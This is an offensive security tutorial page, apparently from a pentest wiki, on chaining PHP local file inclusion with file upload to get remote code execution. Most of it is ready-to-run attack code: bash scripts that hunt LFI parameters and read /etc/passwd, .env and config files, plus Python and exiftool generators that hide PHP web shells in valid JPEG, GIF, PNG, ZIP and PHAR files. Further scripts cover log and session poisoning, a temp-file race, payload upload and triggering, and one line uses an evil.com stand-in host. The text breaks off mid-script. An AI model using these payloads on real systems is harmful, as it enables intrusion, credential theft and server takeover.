---
title: LFI to RCE Via Upload
description: LFI to RCE Via Upload — Chain Local File Inclusion with File Upload for Remote Code Execution
navigation:
  icon: i-lucide-file-symlink
  title: LFI to RCE Via Upload
---

## LFI to RCE Via Upload

Local File Inclusion (LFI) alone reads files. File upload alone stores files. **Chained together, they produce Remote Code Execution.** The attacker uploads a file containing server-side code (PHP, JSP, ASP) disguised as an image, document, or any accepted format. The code passes all upload validation because the file IS a valid image — the payload hides in metadata, comments, or post-EOF data. Then the attacker triggers the LFI vulnerability to **include** the uploaded file. When PHP's `include()` processes the file, it ignores binary image data and executes any `<?php ?>` tags it finds — regardless of the file extension or MIME type.

::note
This chain is devastating because it bypasses the two primary defenses independently. Upload validation passes because the file is a genuine image. The LFI filter passes because the attacker isn't accessing sensitive system files — just an uploaded image. Neither defense detects the attack because the exploitation happens at the **intersection** of two features that are individually safe.
::

The methodology has three phases: **prepare the payload** (embed code in an uploadable file), **deliver it** (upload to a known server path), and **trigger it** (include the uploaded file via LFI). Each phase has multiple techniques depending on what's available on the target.

---

## Understanding the Chain

### How LFI + Upload = RCE

::accordion
  :::accordion-item{icon="i-lucide-cpu" label="The Inclusion Mechanism"}
  PHP's `include()`, `require()`, `include_once()`, and `require_once()` don't care about file extensions. They read the file, look for PHP opening tags (`<?php`, `<?=`, `<?`), and execute any code they find. Everything outside PHP tags is output as raw text (or binary garbage for images).

  **The execution flow:**
  ```text
  1. Attacker uploads: avatar.jpg (valid JPEG with PHP in EXIF comment)
     → Stored at: /var/www/html/uploads/avatar.jpg
     → Upload validation: PASS (valid JPEG, .jpg extension, image/jpeg CT)

  2. Attacker triggers LFI: /index.php?page=../uploads/avatar.jpg
     → LFI filter: may or may not filter (it's just an image path)

  3. PHP executes: include("/var/www/html/uploads/avatar.jpg")
     → PHP opens avatar.jpg
     → Encounters binary JPEG data → outputs as garbage (ignored)
     → Encounters <?php system($_GET["cmd"]); ?> in EXIF comment
     → EXECUTES the PHP code
     → Returns command output mixed with JPEG binary

  4. Result: Remote Code Execution through a valid image file
  ```

  **Why this works:** PHP's include system is **format-agnostic**. It doesn't check if the file is PHP — it processes ANY file looking for PHP tags. A JPEG, PNG, GIF, PDF, or even a ZIP file can contain PHP code that executes when included.
  :::

  :::accordion-item{icon="i-lucide-layers" label="LFI Vulnerability Patterns"}
  LFI vulnerabilities manifest in many forms. Each requires slightly different exploitation:

  | Pattern | Vulnerable Code | Exploitation |
  | ------- | --------------- | ------------ |
  | **Direct include** | `include($_GET['page'])` | `?page=../uploads/shell.jpg` |
  | **Extension appended** | `include($_GET['page'] . '.php')` | Null byte: `?page=../uploads/shell.jpg%00` (PHP<5.3.4) |
  | **Directory prepend** | `include('pages/' . $_GET['p'])` | `?p=../../uploads/shell.jpg` |
  | **Both prepend+append** | `include('pages/' . $_GET['p'] . '.php')` | Null byte or path truncation |
  | **Wrapper allowed** | `include($_GET['file'])` | `php://filter`, `data://`, `zip://`, `phar://` |
  | **Template include** | `render(template=$_GET['t'])` | Template injection + upload |
  | **Language file** | `include('lang/' . $_GET['lang'] . '.php')` | `?lang=../../uploads/shell.jpg%00` |
  | **Theme file** | `include('themes/' . $_GET['theme'] . '/header.php')` | Path traversal to uploads |
  :::

  :::accordion-item{icon="i-lucide-target" label="Upload Payload Locations"}
  Code can be embedded in uploaded files at multiple locations:

  | Location | Survives Re-encoding | Detection Difficulty |
  | -------- | ------------------- | -------------------- |
  | **EXIF Comment** | Sometimes | Low |
  | **EXIF ImageDescription** | Sometimes | Low |
  | **EXIF Artist/Copyright** | Sometimes | Low |
  | **JPEG COM segment** | Usually | Low |
  | **PNG tEXt chunk** | Usually | Low |
  | **PNG zTXt chunk** | Usually | Medium |
  | **GIF comment extension** | Usually | Low |
  | **Post-EOF data** | Always (never processed) | Very Low |
  | **ICC color profile** | Often | High |
  | **XMP metadata** | Sometimes | Medium |
  | **IDAT pixel data** | Yes (in pixel values) | Very High |
  | **ZIP comment** | Yes | Low |
  | **PDF stream** | Yes | Medium |
  | **Polyglot structure** | Yes | High |
  :::
::

---

## Phase 1 — LFI Discovery & Confirmation

Before crafting upload payloads, find and confirm the LFI vulnerability.

### LFI Parameter Discovery

::tabs
  :::tabs-item{icon="i-lucide-search" label="Parameter Hunting"}
  ```bash
  TARGET="https://target.com"

  echo "═══ LFI Parameter Discovery ═══"

  # ── Crawl for inclusion parameters ──
  katana -u "$TARGET" -d 5 -jc -kf -o crawl.txt 2>/dev/null

  # Filter for file-inclusion-like parameters
  grep -iE "[?&](file|page|path|dir|doc|folder|template|include|inc|load|read|fetch|view|content|module|action|layout|theme|style|lang|locale|cat|category|download|src|resource|location|display|show|pg|p|f|item|section|part)=" crawl.txt | sort -u | tee lfi_candidates.txt

  echo "[+] Found $(wc -l < lfi_candidates.txt) potential LFI parameters"

  # ── Historical URL mining ──
  {
      echo "$TARGET" | gau --threads 10 2>/dev/null
      echo "$TARGET" | waybackurls 2>/dev/null
  } | grep -iE "[?&](file|page|path|template|include|load|view|lang|theme|module|content|doc)=" | sort -u >> lfi_candidates.txt

  sort -u lfi_candidates.txt -o lfi_candidates.txt

  # ── Parameter brute force ──
  echo ""
  echo "─── Parameter Brute Force ───"
  PARAMS=(
      file page path dir doc folder template include inc load read
      fetch view content module action layout theme style lang locale
      cat category download src resource location display show pg p
      f item section part component tpl skin wrapper conf config
      filename filepath name rsc pdf document report log img image
  )

  for param in "${PARAMS[@]}"; do
      # Test with known readable file
      STATUS=$(curl -s -o /tmp/lfi_probe.txt -w "%{http_code}" \
        "${TARGET}/index.php?${param}=../../../etc/passwd" --max-time 5 2>/dev/null)
      if grep -q "root:" /tmp/lfi_probe.txt 2>/dev/null; then
          echo "[!!!] LFI CONFIRMED: ?${param}=../../../etc/passwd"
      elif [ "$STATUS" = "500" ]; then
          echo "[!]   Possible: ?${param}= (500 error — may indicate inclusion attempt)"
      fi
  done

  rm -f /tmp/lfi_probe.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="LFI Confirmation & Depth Detection"}
  ```bash
  TARGET="https://target.com"
  # Replace with discovered parameter
  LFI_PARAM="page"
  LFI_URL="${TARGET}/index.php"

  echo "═══ LFI Confirmation & Depth Detection ═══"

  # ── Test traversal depths ──
  echo "─── Traversal Depth Detection ───"
  for depth in 1 2 3 4 5 6 7 8 9 10; do
      TRAVERSAL=$(printf '../%.0s' $(seq 1 $depth))
      RESULT=$(curl -s "${LFI_URL}?${LFI_PARAM}=${TRAVERSAL}etc/passwd" --max-time 5 2>/dev/null)
      if echo "$RESULT" | grep -q "root:"; then
          echo "[+] Depth ${depth}: ${TRAVERSAL}etc/passwd → /etc/passwd READABLE"
          LFI_DEPTH=$depth
          break
      fi
  done

  if [ -z "$LFI_DEPTH" ]; then
      echo "[-] Standard traversal failed — trying encoding bypasses"

      # Encoding variants
      for payload in \
          "....//....//....//etc/passwd" \
          "..%2f..%2f..%2fetc%2fpasswd" \
          "..%252f..%252f..%252fetc%252fpasswd" \
          "%2e%2e/%2e%2e/%2e%2e/etc/passwd" \
          "..%c0%af..%c0%af..%c0%afetc/passwd" \
          "..%5c..%5c..%5cetc/passwd" \
          "....\\....\\....\\etc\\passwd" \
          "/etc/passwd" \
          "file:///etc/passwd"; do
          RESULT=$(curl -s "${LFI_URL}?${LFI_PARAM}=${payload}" --max-time 5 2>/dev/null)
          if echo "$RESULT" | grep -q "root:"; then
              echo "[+] Bypass found: ${payload}"
              break
          fi
      done
  fi

  # ── Test for extension appending ──
  echo ""
  echo "─── Extension Append Detection ───"

  # Without extension — if /etc/passwd works, no extension appended
  RESULT=$(curl -s "${LFI_URL}?${LFI_PARAM}=$(printf '../%.0s' $(seq 1 ${LFI_DEPTH:-3}))etc/passwd" 2>/dev/null)
  if echo "$RESULT" | grep -q "root:"; then
      echo "[+] No extension appended — direct inclusion"
  fi

  # With null byte (PHP < 5.3.4)
  RESULT=$(curl -s "${LFI_URL}?${LFI_PARAM}=$(printf '../%.0s' $(seq 1 ${LFI_DEPTH:-3}))etc/passwd%00" 2>/dev/null)
  if echo "$RESULT" | grep -q "root:"; then
      echo "[+] Null byte truncation works — PHP < 5.3.4"
  fi

  # With path truncation (long path)
  LONG_PATH="$(printf '../%.0s' $(seq 1 ${LFI_DEPTH:-3}))etc/passwd"
  for i in $(seq 1 2050); do LONG_PATH="${LONG_PATH}/."; done
  RESULT=$(curl -s "${LFI_URL}?${LFI_PARAM}=${LONG_PATH}" --max-time 10 2>/dev/null)
  if echo "$RESULT" | grep -q "root:"; then
      echo "[+] Path truncation works — long path bypasses extension"
  fi

  # ── Test for PHP wrappers ──
  echo ""
  echo "─── PHP Wrapper Support ───"

  # php://filter — read source code
  RESULT=$(curl -s "${LFI_URL}?${LFI_PARAM}=php://filter/convert.base64-encode/resource=index" 2>/dev/null)
  if echo "$RESULT" | grep -qE "^[A-Za-z0-9+/=]{50,}"; then
      echo "[+] php://filter works — can read source code"
  fi

  # data:// wrapper
  RESULT=$(curl -s "${LFI_URL}?${LFI_PARAM}=data://text/plain;base64,PD9waHAgZWNobyAiTEZJX0RBVEFfV1JBUFBFUiI7ID8+" 2>/dev/null)
  if echo "$RESULT" | grep -q "LFI_DATA_WRAPPER"; then
      echo "[!!!] data:// wrapper works — DIRECT RCE without upload!"
  fi

  # expect:// wrapper
  RESULT=$(curl -s "${LFI_URL}?${LFI_PARAM}=expect://id" 2>/dev/null)
  if echo "$RESULT" | grep -q "uid="; then
      echo "[!!!] expect:// wrapper works — DIRECT RCE!"
  fi

  # zip:// wrapper
  echo "[*] zip:// may work if we can upload a ZIP containing PHP"

  # phar:// wrapper
  echo "[*] phar:// may work for deserialization if we can upload a PHAR"
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Upload Path Discovery"}
  ```bash
  TARGET="https://target.com"
  LFI_URL="${TARGET}/index.php"
  LFI_PARAM="page"
  DEPTH="../../../../"

  echo "═══ Upload Path Discovery (via LFI) ═══"
  echo "[*] Using LFI to find where uploads are stored"

  # ── Read web server config to find upload paths ──
  echo "─── Server Configuration ───"

  CONFIG_FILES=(
      "/etc/apache2/apache2.conf"
      "/etc/apache2/sites-enabled/000-default.conf"
      "/etc/apache2/sites-enabled/default-ssl.conf"
      "/etc/nginx/nginx.conf"
      "/etc/nginx/sites-enabled/default"
      "/etc/nginx/conf.d/default.conf"
      "/opt/tomcat/conf/server.xml"
      "/var/www/html/.env"
      "/var/www/html/config.php"
      "/var/www/html/wp-config.php"
      "/var/www/html/configuration.php"
      "/var/www/html/config/database.php"
      "/var/www/html/app/config/parameters.yml"
      "/proc/self/cmdline"
      "/proc/self/environ"
  )

  for conf in "${CONFIG_FILES[@]}"; do
      RESULT=$(curl -s "${LFI_URL}?${LFI_PARAM}=${DEPTH}${conf}" --max-time 5 2>/dev/null)
      if [ ${#RESULT} -gt 100 ] && ! echo "$RESULT" | grep -qi "not found\|no such\|warning\|error"; then
          echo "[+] Readable: ${conf}"
          # Extract upload-related paths
          echo "$RESULT" | grep -ioE "(upload|media|image|file|attachment|content|storage)[^'\"<> ]*" | head -5 | sed 's/^/    Path: /'
      fi
  done

  # ── Upload a marker file and find it ──
  echo ""
  echo "─── Upload & Locate Marker File ───"

  MARKER="LFI_PATH_PROBE_$(date +%s)"
  echo "$MARKER" > /tmp/marker.txt

  # Upload marker
  RESP=$(curl -s -X POST "${TARGET}/api/upload" \
    -F "file=@/tmp/marker.txt;filename=marker.txt" \
    -H "Cookie: session=TOKEN" 2>/dev/null)
  echo "[*] Upload response: $(echo "$RESP" | head -c 100)"

  # Search for marker via LFI
  UPLOAD_DIRS=(
      "uploads" "upload" "files" "media" "images" "static"
      "content" "assets" "user-content" "attachments" "data"
      "tmp" "temp" "public/uploads" "storage/uploads"
      "wp-content/uploads" "sites/default/files"
  )

  for dir in "${UPLOAD_DIRS[@]}"; do
      RESULT=$(curl -s "${LFI_URL}?${LFI_PARAM}=${DEPTH}var/www/html/${dir}/marker.txt" --max-time 3 2>/dev/null)
      if echo "$RESULT" | grep -q "$MARKER"; then
          echo "[!!!] Upload path found: /var/www/html/${dir}/"
          UPLOAD_PATH="/var/www/html/${dir}"
          break
      fi
  done

  # Also try relative paths
  for dir in "${UPLOAD_DIRS[@]}"; do
      RESULT=$(curl -s "${LFI_URL}?${LFI_PARAM}=../${dir}/marker.txt" --max-time 3 2>/dev/null)
      if echo "$RESULT" | grep -q "$MARKER"; then
          echo "[!!!] Relative upload path: ../${dir}/"
          break
      fi
  done

  rm -f /tmp/marker.txt
  ```
  :::
::

---

## Phase 2 — Upload Payload Preparation

### Embedding PHP in Image Files

::tabs
  :::tabs-item{icon="i-lucide-image" label="EXIF Injection (Most Reliable)"}
  ```bash
  # EXIF-injected images pass ALL validation:
  # ✓ Valid magic bytes ✓ getimagesize() ✓ Full image parsing
  # ✓ Image viewers display normally ✓ Correct dimensions

  # ── Create valid base image ──
  python3 -c "
  from PIL import Image
  img = Image.new('RGB', (200, 200))
  pixels = img.load()
  for x in range(200):
      for y in range(200):
          pixels[x,y] = ((x*7+50)%256, (y*13+100)%256, ((x+y)*3+75)%256)
  img.save('lfi_payload.jpg', 'JPEG', quality=95)
  " 2>/dev/null

  # ── Inject PHP into EVERY EXIF field (maximum survival) ──
  exiftool \
    -Comment='<?php system($_GET["cmd"]); ?>' \
    -ImageDescription='<?php eval($_POST["e"]); ?>' \
    -Artist='<?=`$_GET[c]`?>' \
    -Copyright='<?php passthru($_GET["cmd"]); ?>' \
    -UserComment='<?php echo shell_exec($_REQUEST["cmd"]); ?>' \
    -Make='<?php phpinfo(); ?>' \
    -Model='<?php readfile($_GET["f"]); ?>' \
    -Software='<?php highlight_file($_GET["f"]); ?>' \
    -DocumentName='<?php file_put_contents("s.php",base64_decode($_POST["d"])); ?>' \
    -XPTitle='<?php system($_GET["cmd"]); ?>' \
    -XPComment='<?php eval($_POST["e"]); ?>' \
    -XPAuthor='<?php passthru($_GET["cmd"]); ?>' \
    -overwrite_original lfi_payload.jpg

  # ── Verify ──
  file lfi_payload.jpg        # JPEG image data, JFIF standard
  python3 -c "from PIL import Image; img=Image.open('lfi_payload.jpg'); img.verify(); print(f'Valid JPEG: {img.size}')" 2>/dev/null
  echo "PHP payloads embedded: $(strings lfi_payload.jpg | grep -c '<?php')"

  # ── Create copies for different upload scenarios ──
  cp lfi_payload.jpg lfi_shell.jpg
  cp lfi_payload.jpg lfi_shell.jpeg
  cp lfi_payload.jpg lfi_shell.png   # Wrong format but may work
  cp lfi_payload.jpg lfi_shell.gif   # Wrong format but may work

  echo "[+] EXIF-injected payloads ready"
  ```
  :::

  :::tabs-item{icon="i-lucide-image" label="JPEG COM Segment Injection"}
  ```python [jpeg_com_lfi_payload.py]
  #!/usr/bin/env python3
  """
  Inject PHP into JPEG COM (Comment) segment.
  The COM segment is the most reliable location — it survives
  most image processing and is included when the file is read.
  """
  import struct
  from PIL import Image
  import io

  def create_lfi_jpeg(output, php_code, width=200, height=200):
      """Create valid JPEG with PHP in COM segment"""
      payload = php_code.encode()

      # Create genuine image
      img = Image.new('RGB', (width, height))
      pixels = img.load()
      for x in range(width):
          for y in range(height):
              pixels[x, y] = ((x*7+50)%256, (y*13+100)%256, ((x+y)*3+75)%256)

      buf = io.BytesIO()
      img.save(buf, 'JPEG', quality=90, subsampling=0)
      jpeg = buf.getvalue()

      # Insert COM segment after SOI + APP0
      soi = jpeg[:2]
      rest = jpeg[2:]

      pos = 0
      if rest[0:2] == b'\xff\xe0':
          app0_len = struct.unpack('>H', rest[2:4])[0]
          pos = 2 + app0_len

      com = b'\xff\xfe' + struct.pack('>H', len(payload) + 2) + payload
      result = soi + rest[:pos] + com + rest[pos:]

      # Also append PHP after EOI (belt and suspenders)
      result += b'\n' + payload

      with open(output, 'wb') as f:
          f.write(result)

      # Verify
      Image.open(output).verify()
      print(f"[+] {output} — Valid JPEG + PHP ({len(result):,} bytes)")

  # Generate payloads
  shells = {
      'system':   '<?php system($_GET["cmd"]); ?>',
      'eval':     '<?php eval($_POST["e"]); ?>',
      'exec':     '<?php echo "<pre>".shell_exec($_REQUEST["cmd"])."</pre>"; ?>',
      'minimal':  '<?=`$_GET[c]`?>',
      'passthru': '<?php passthru($_GET["cmd"]); ?>',
      'phpinfo':  '<?php phpinfo(); ?>',
      'file_put': '<?php file_put_contents("shell.php","<?php system(\\$_GET[cmd]); ?>"); echo "WRITTEN"; ?>',
      'b64_eval': '<?php eval(base64_decode($_POST["e"])); ?>',
  }

  for name, code in shells.items():
      create_lfi_jpeg(f'lfi_jpeg_{name}.jpg', code)
  ```
  :::

  :::tabs-item{icon="i-lucide-image" label="GIF Payload (Simplest)"}
  ```bash
  # GIF is the easiest format — header is plain ASCII
  # PHP ignores binary data outside <?php ?> tags

  SHELL='<?php system($_GET["cmd"]); ?>'

  # Method 1: Header + shell (ultra minimal)
  echo -n "GIF89a${SHELL}" > lfi_gif_minimal.gif

  # Method 2: Full valid GIF with shell in comment
  python3 -c "
  shell = b'<?php system(\$_GET[\"cmd\"]); ?>'
  gif = bytearray()
  gif += b'GIF89a'
  gif += b'\x01\x00\x01\x00\x80\x00\x00'
  gif += b'\xff\xff\xff\x00\x00\x00'
  # Comment extension with PHP
  gif += b'\x21\xfe'
  gif += bytes([len(shell)]) + shell
  gif += b'\x00'
  # Image data
  gif += b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00'
  gif += b'\x3b'
  # Also append after trailer
  gif += b'\n' + shell
  open('lfi_gif_full.gif', 'wb').write(bytes(gif))
  print(f'[+] lfi_gif_full.gif — Valid GIF + PHP ({len(gif)} bytes)')
  "

  # Method 3: Multiple shells in GIF comments
  python3 -c "
  shells = [
      b'<?php system(\$_GET[\"cmd\"]); ?>',
      b'<?php eval(\$_POST[\"e\"]); ?>',
      b'<?=\`\$_GET[c]\`?>',
      b'<?php passthru(\$_GET[\"cmd\"]); ?>',
  ]
  gif = bytearray(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00')
  for s in shells:
      gif += b'\x21\xfe'
      gif += bytes([len(s)]) + s
      gif += b'\x00'
  gif += b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
  open('lfi_gif_multi.gif', 'wb').write(bytes(gif))
  print(f'[+] lfi_gif_multi.gif — {len(shells)} shells ({len(gif)} bytes)')
  "

  file lfi_gif_minimal.gif lfi_gif_full.gif
  ```
  :::

  :::tabs-item{icon="i-lucide-image" label="PNG Payload"}
  ```bash
  # PNG uses text chunks (tEXt, zTXt, iTXt) for metadata
  # These survive most processing and are included by PHP

  python3 -c "
  import struct, zlib
  from PIL import Image, PngImagePlugin
  import io

  shell = b'<?php system(\$_GET[\"cmd\"]); ?>'

  # Method 1: PNG with tEXt chunk
  img = Image.new('RGBA', (100, 100), (255, 0, 0, 255))
  info = PngImagePlugin.PngInfo()
  info.add_text('Comment', shell.decode())
  info.add_text('Description', '<?php eval(\$_POST[\"e\"]); ?>')
  info.add_text('Author', '<?=\`\$_GET[c]\`?>')
  img.save('lfi_png_text.png', 'PNG', pnginfo=info)
  print('[+] lfi_png_text.png — PHP in tEXt chunks')

  # Method 2: PNG with PHP appended after IEND
  buf = io.BytesIO()
  img.save(buf, 'PNG')
  png_data = buf.getvalue()
  with open('lfi_png_posteof.png', 'wb') as f:
      f.write(png_data + b'\n' + shell)
  print('[+] lfi_png_posteof.png — PHP after IEND')
  "

  file lfi_png_text.png lfi_png_posteof.png
  strings lfi_png_text.png | grep -c "php"
  ```
  :::

  :::tabs-item{icon="i-lucide-image" label="ZIP/PHAR Payload (For zip:// and phar://)"}
  ```bash
  # If LFI supports zip:// or phar:// wrappers,
  # we can upload a ZIP/PHAR containing PHP

  # ── ZIP payload (for zip://uploads/file.zip#shell.php) ──
  echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
  zip lfi_zip_payload.zip /tmp/shell.php
  # Rename to image extension
  cp lfi_zip_payload.zip lfi_zip_payload.jpg

  echo "[+] lfi_zip_payload.jpg — ZIP containing shell.php"
  echo "    Include via: zip://uploads/lfi_zip_payload.jpg%23shell.php"

  # ── PHAR payload (for phar://uploads/file.jpg/shell.php) ──
  php -d phar.readonly=0 -r '
  $phar = new Phar("lfi_phar_payload.phar");
  $phar->startBuffering();
  $phar->setStub("\xff\xd8\xff\xe0" . "<?php __HALT_COMPILER(); ?>");
  $phar["shell.php"] = "<?php system(\$_GET[\"cmd\"]); ?>";
  $phar->stopBuffering();
  ' 2>/dev/null

  if [ -f "lfi_phar_payload.phar" ]; then
      cp lfi_phar_payload.phar lfi_phar_payload.jpg
      echo "[+] lfi_phar_payload.jpg — PHAR with JPEG stub + shell.php"
      echo "    Include via: phar://uploads/lfi_phar_payload.jpg/shell.php"
  fi

  rm -f /tmp/shell.php
  ```
  :::
::

### Special Payload Types

::code-group
```bash [Log File Payload (No Upload Needed)]
# If LFI exists but no upload is available,
# inject PHP into log files, then include them

TARGET="https://target.com"
LFI_URL="${TARGET}/index.php"
LFI_PARAM="page"
DEPTH="../../../../"

echo "═══ Log Poisoning — No Upload Required ═══"

# ── Step 1: Inject PHP into Apache access log via User-Agent ──
curl -s "$TARGET/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>" > /dev/null

# ── Step 2: Include the access log ──
LOG_PATHS=(
    "var/log/apache2/access.log"
    "var/log/apache2/error.log"
    "var/log/httpd/access_log"
    "var/log/httpd/error_log"
    "var/log/nginx/access.log"
    "var/log/nginx/error.log"
    "opt/lampp/logs/access_log"
    "opt/lampp/logs/error_log"
    "xampp/apache/logs/access.log"
    "usr/local/apache2/logs/access_log"
    "proc/self/fd/1"
)

for log in "${LOG_PATHS[@]}"; do
    RESULT=$(curl -s "${LFI_URL}?${LFI_PARAM}=${DEPTH}${log}&cmd=id" --max-time 5 2>/dev/null)
    if echo "$RESULT" | grep -q "uid="; then
        echo "[!!!] Log poisoning RCE via: ${log}"
        echo "    URL: ${LFI_URL}?${LFI_PARAM}=${DEPTH}${log}&cmd=COMMAND"
        break
    fi
done

# ── SSH log poisoning (alternative) ──
# ssh '<?php system($_GET["cmd"]); ?>'@target.com 2>/dev/null
# Then include: /var/log/auth.log

# ── SMTP log poisoning ──
# swaks --to admin@target.com --from '<?php system($_GET["cmd"]); ?>'@evil.com --server target.com

# ── /proc/self/environ poisoning ──
RESULT=$(curl -s "${LFI_URL}?${LFI_PARAM}=${DEPTH}proc/self/environ&cmd=id" \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>" --max-time 5 2>/dev/null)
if echo "$RESULT" | grep -q "uid="; then
    echo "[!!!] /proc/self/environ RCE confirmed!"
fi
```

```bash [PHP Session Payload]
# PHP stores sessions as files — inject PHP into session data,
# then include the session file

TARGET="https://target.com"
LFI_URL="${TARGET}/index.php"
LFI_PARAM="page"
DEPTH="../../../../"

echo "═══ PHP Session Injection ═══"

# Step 1: Create a session with PHP code in a parameter
# that gets stored in the session
curl -s "${TARGET}/login" \
  -d "username=<?php system(\$_GET['cmd']); ?>&password=test" \
  -c /tmp/session_cookies.txt > /dev/null

# Extract session ID
SESSID=$(grep PHPSESSID /tmp/session_cookies.txt | awk '{print $NF}')
echo "[*] Session ID: ${SESSID}"

# Step 2: Include the session file
SESSION_PATHS=(
    "tmp/sess_${SESSID}"
    "var/lib/php/sessions/sess_${SESSID}"
    "var/lib/php5/sessions/sess_${SESSID}"
    "var/lib/php/sess_${SESSID}"
    "tmp/php_sessions/sess_${SESSID}"
)

for spath in "${SESSION_PATHS[@]}"; do
    RESULT=$(curl -s "${LFI_URL}?${LFI_PARAM}=${DEPTH}${spath}&cmd=id" --max-time 5 2>/dev/null)
    if echo "$RESULT" | grep -q "uid="; then
        echo "[!!!] Session inclusion RCE via: ${spath}"
        echo "    URL: ${LFI_URL}?${LFI_PARAM}=${DEPTH}${spath}&cmd=COMMAND"
        break
    fi
done

rm -f /tmp/session_cookies.txt
```

```bash [Temporary Upload File (Race Condition)]
# PHP stores uploaded files temporarily in /tmp/php*
# during request processing. Race to include before cleanup.

TARGET="https://target.com"
LFI_URL="${TARGET}/index.php"
LFI_PARAM="page"
DEPTH="../../../../"

echo "═══ PHP Temp File Race Condition ═══"
echo "[*] This exploits the temporary file created during upload"
echo "[*] PHP stores uploads in /tmp/phpXXXXXX during processing"

# The technique: Send an upload with PHP code, and simultaneously
# try to include /tmp/php* files via LFI

# Create PHP shell to upload
echo '<?php system($_GET["cmd"]); ?>' > /tmp/race_shell.php

# Rapid upload + LFI access
for i in $(seq 1 100); do
    # Upload (creates temp file)
    curl -s -X POST "${TARGET}/upload" \
      -F "file=@/tmp/race_shell.php" \
      -H "Cookie: session=TOKEN" &

    # Try to include temp files (brute force name)
    for suffix in $(seq -w 000000 000100); do
        curl -s "${LFI_URL}?${LFI_PARAM}=${DEPTH}tmp/php${suffix}&cmd=id" --max-time 1 2>/dev/null | \
          grep -q "uid=" && echo "[!!!] Race won at /tmp/php${suffix}" && break 3
    done

    wait
done

rm -f /tmp/race_shell.php
```
::

---

## Phase 3 — Upload & Trigger

### Upload the Payload

::tabs
  :::tabs-item{icon="i-lucide-upload" label="Upload via Application"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo "═══ Uploading LFI Payloads ═══"

  # Upload each payload variant
  for payload_file in lfi_payload.jpg lfi_gif_full.gif lfi_png_text.png \
                       lfi_jpeg_system.jpg lfi_zip_payload.jpg; do
      [ -f "$payload_file" ] || continue
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@${payload_file};type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      echo "[${STATUS}] ${payload_file}"
  done

  # Upload with different Content-Types for each
  echo ""
  echo "─── Content-Type Variations ───"

  for ct in "image/jpeg" "image/png" "image/gif" "application/octet-stream"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@lfi_payload.jpg;filename=avatar.jpg;type=${ct}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] CT:${ct} accepted"
  done

  # Note the uploaded filename for LFI inclusion
  echo ""
  echo "[*] Upload response should contain the stored filename/path"
  echo "[*] Common patterns: /uploads/avatar.jpg, /media/[hash].jpg, /files/[uuid].jpg"
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Find Uploaded File Path"}
  ```bash
  TARGET="https://target.com"
  LFI_URL="${TARGET}/index.php"
  LFI_PARAM="page"
  DEPTH="../../../../"
  UPLOADED_FILENAME="avatar.jpg"  # From upload response

  echo "═══ Locating Uploaded File for LFI ═══"

  # ── Method 1: Direct URL check ──
  echo "─── Direct URL Probing ───"
  for dir in uploads files media images content static assets data; do
      URL="${TARGET}/${dir}/${UPLOADED_FILENAME}"
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] Direct URL: ${URL}"
  done

  # ── Method 2: Include via LFI (try all common paths) ──
  echo ""
  echo "─── LFI Path Probing ───"

  INCLUDE_PATHS=(
      # Absolute paths (most reliable)
      "/var/www/html/uploads/${UPLOADED_FILENAME}"
      "/var/www/html/files/${UPLOADED_FILENAME}"
      "/var/www/html/media/${UPLOADED_FILENAME}"
      "/var/www/html/images/${UPLOADED_FILENAME}"
      "/var/www/html/content/${UPLOADED_FILENAME}"
      "/var/www/html/static/${UPLOADED_FILENAME}"
      "/var/www/html/assets/${UPLOADED_FILENAME}"
      "/var/www/uploads/${UPLOADED_FILENAME}"
      "/var/www/files/${UPLOADED_FILENAME}"
      "/srv/www/htdocs/uploads/${UPLOADED_FILENAME}"
      "/home/www/uploads/${UPLOADED_FILENAME}"
      # Relative paths
      "uploads/${UPLOADED_FILENAME}"
      "../uploads/${UPLOADED_FILENAME}"
      "../../uploads/${UPLOADED_FILENAME}"
      "files/${UPLOADED_FILENAME}"
      "../files/${UPLOADED_FILENAME}"
      "media/${UPLOADED_FILENAME}"
      "../media/${UPLOADED_FILENAME}"
      "images/${UPLOADED_FILENAME}"
      "../images/${UPLOADED_FILENAME}"
  )

  for path in "${INCLUDE_PATHS[@]}"; do
      # Use the LFI with traversal to reach the file
      if [[ "$path" == /* ]]; then
          # Absolute path — use enough traversal to reach root
          LFI_PATH="${DEPTH}${path#/}"
      else
          # Relative path — use as-is or with some traversal
          LFI_PATH="../${path}"
      fi

      RESULT=$(curl -s "${LFI_URL}?${LFI_PARAM}=${LFI_PATH}&cmd=echo+LFI_UPLOAD_RCE_CONFIRMED" --max-time 5 2>/dev/null)

      if echo "$RESULT" | grep -q "LFI_UPLOAD_RCE_CONFIRMED"; then
          echo "[!!!] LFI+UPLOAD RCE CONFIRMED!"
          echo "    LFI URL: ${LFI_URL}?${LFI_PARAM}=${LFI_PATH}&cmd=COMMAND"
          echo ""
          echo "[*] Testing with id command:"
          curl -s "${LFI_URL}?${LFI_PARAM}=${LFI_PATH}&cmd=id" | grep "uid="
          break
      fi
  done
  ```
  :::
::

### Trigger the Chain — Complete Exploitation

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Standard LFI Include"}
  ```bash
  # ═══════════════════════════════════════════════
  # Include uploaded image via standard path traversal
  # ═══════════════════════════════════════════════

  TARGET="https://target.com"
  LFI_PARAM="page"

  # Using discovered path from Phase 3
  LFI_SHELL="${TARGET}/index.php?${LFI_PARAM}=../../../../var/www/html/uploads/avatar.jpg"

  echo "═══ LFI + Upload Chain Execution ═══"

  # Basic command execution
  curl -s "${LFI_SHELL}&cmd=id"
